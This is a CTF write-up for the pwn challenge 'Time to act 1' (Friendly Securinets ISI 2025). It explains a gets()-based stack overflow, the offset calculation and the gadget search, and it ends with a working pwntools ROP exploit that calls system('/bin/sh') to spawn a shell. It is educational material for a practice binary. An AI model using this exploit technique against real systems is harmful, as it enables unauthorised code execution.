---
title: "Friendly Securinets ISI 2025 - Time to act 1"
date: 2025-11-16 09:14:00 +0100
categories: [friendly-isi-2025]
tags: [pwn, rop, writeup, securinets , isi]
---

# [Time to act 1] Writeup

**CTF:** Friendly Securinets ISI 2025  
**Category:** [pwn]  
**Points:** [500]  
**Author:** hyzr  


## Tools Used

- `gdb` / `ropper` / `readelf` / ``  
- `python3 (pwntools)` for exploit scripting  

---

## Analysis

- Okay so we were given an elf binary called main , we simply analyse it using   
- file and checksec command
- **file ./main** then **checksec --file ./main**

![file and checksec output](https://media.discordapp.net/attachments/1439691535397552128/1439691554892812339/image.png?ex=691b70be&is=691a1f3e&hm=5cfdf694f33f2640d01c721472ec398dbfa903d0e1e3ffd2f48448c2144458b6&=&format=webp&quality=lossless&width=1872&height=579)

- As we can see the bianry is 64 bit , there's no pie nor a canary which is great , can't execute shellcode on stack and relro is partial which allows us to write in some regions .

- Let's execute the binary and see what it shows us 

![binary output](https://media.discordapp.net/attachments/1439691535397552128/1439693349526442045/image.png?ex=691b726a&is=691a20ea&hm=6aaded34ad56b1b76a29a057fcebe98bb1ee8166ca96e51d5706c1a4a94897c0&=&format=webp&quality=lossless&width=1872&height=369)

- So based on this output we see that we triggered a segmentation fault meaning we wrote somwhere we shouldnt , and it also gives us **/bin/sh** which is very good for us and now i already know what i need to , we're definetly gonna use it , let's keep analysing further

- I will now use gdb to see what functions this binary have and calculate the offset to rip
- i executed **gdb -q ./main** to debug it ( the -q means quiet and less output in intro )
- then i typed 'info func' which will show us the available functions and their addresses ,
- we can definetly return and use any function we want amoung these ! ( atht's what will happen lol)

![gdb info func output](https://media.discordapp.net/attachments/1439691535397552128/1439694894200389754/image.png?ex=691b73db&is=691a225b&hm=32ab43b42f287b374755bd635d3a3a9c63d96dda999faa7c8bb0de111e1796d2&=&format=webp&quality=lossless&width=1840&height=751)

- Well theres's no win function like we were used to , but we have system !! , which will allow us to execute any system command , but where are we gonna use it ? 
- Let's calculate the offset from our buffer till the rip , let's disassemble the main function using **disass main**

![disassembly of main function](https://media.discordapp.net/attachments/1439691535397552128/1439697082377048336/image.png?ex=691b75e4&is=691a2464&hm=b27c5d811460d09a86749a6e8811513d919d250bf4308b1a75384bc28f1a0ae7&=&format=webp&quality=lossless&width=1872&height=375)

- the main calls vuln function , let's see what happens in it by disassembling it aswell using **disass vuln**

![disassembly of vuln function](https://media.discordapp.net/attachments/1439691535397552128/1439698922489774100/image.png?ex=691b779b&is=691a261b&hm=e558ed3f4c49c8bcb36b0c7fc5b0a05c106cf2860ef0bf8b37b24172c9a8a049&=&format=webp&quality=lossless&width=1522&height=751)

- As we can see from the disassemblmy of vuln , the binary is using gets whic is a **DANGEROUS** function to read the input with because it dosen't check the size of ur input and can lead to buffer overflows .
- Our input variable is located in **rbp-0x100** meaning to reach rbp we need **0x100** and after rbp we have **rip** which is our target so to start writing in the **rip** we need : **0x100 + 8 = 0x108 bytes**

- Remember the string we got when we first ran the binary ? :
- "I will give you this btw: /bin/sh"
- In a nutshell we need to call **system** and pass **/bin/sh**
- we have the address to system which is **0x4010a0** that we got earlier from gdb and seeing the - - available functions now we need to figure out where is **/bin/sh** and how to get its address
- There are many tools like **strings readelf objdump** that allow you to search for strings/texts - inside the binary , the i used and worked for me was **strings -tx ./main**
- and since we are only intrested in **/bin/sh** i finally executed :
- **strings -tx ./main | grep bin** 

- ![strings and grep output](https://media.discordapp.net/attachments/1439691535397552128/1439701919026122843/image.png?ex=691b7a65&is=691a28e5&hm=956f94049f0bcb295e157b5e45de07f2f5ee373866781b8f181f28c75038f09d&=&format=webp&quality=lossless&width=1872&height=116)


- Keep in mind that 2058 is the address to the whole string , so we need to do some math haha , to - reach / we need to add 25 more bytes and that's it the final address of **/bin/sh** is **0x2058 + - 25**

- Now before starting to write our script we just need to get some gadgets that'll help us set the - right arguments in our case the first argument which is represented by the register **rdi** in 
- the **System V AMD64 ABI x86_64** , and **gadgets** are simply a set of instructions that ends
- with a ret , we use the tool **ropper** to see the available gadgets in our binary 
- m gonna execute **ropper --file ./main** it produce a long output but we are only intrested in
- **pop rdi ret** and **ret** in case there's an alignement issue

![pop rdi ret address](https://media.discordapp.net/attachments/1439691535397552128/1439707019341992026/image.png?ex=691b7f25&is=691a2da5&hm=3a2c1f4ae2ee5bdd37f2be522564971c6e16d51f80a1d6296d13d21c428f7838&=&format=webp&quality=lossless&width=1872&height=197)

![ret address](https://media.discordapp.net/attachments/1439691535397552128/1439707147750342706/image.png?ex=691b7f44&is=691a2dc4&hm=ed67fade41b425f5c446d388f7ed5e5b456a04d16436eba76b03caf2d11613a2&=&format=webp&quality=lossless&width=1872&height=185)

## Exploitation / Solution

- now finally we can start writing the exploit script and this is what i ended up writing , it 
- worked locally and remotely :

```python
from pwn import *

#p = remote("4.233.145.123" , 12003)
p = process("./main")

system = 0x4010a0
pop_rdi_ret = 0x4011be
ret = 0x40101a

# 2058 -> I will give you this btw: /bin/sh
binsh_offset = 0x2058 + 25
binsh = 0x400000 + binsh_offset

pay = b"A"*0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)

p.sendline(pay)
p.interactive()

```

- if we run it we get this :

![solver.py output](https://media.discordapp.net/attachments/1439691535397552128/1439708513717719243/image.png?ex=691b808a&is=691a2f0a&hm=e91e3c7e3bd24a39134a613970efac4fad53e1cb24dd98bfd518a1e7a521ec23&=&format=webp&quality=lossless&width=1872&height=486)


- Thanks for reading hope this was helpful !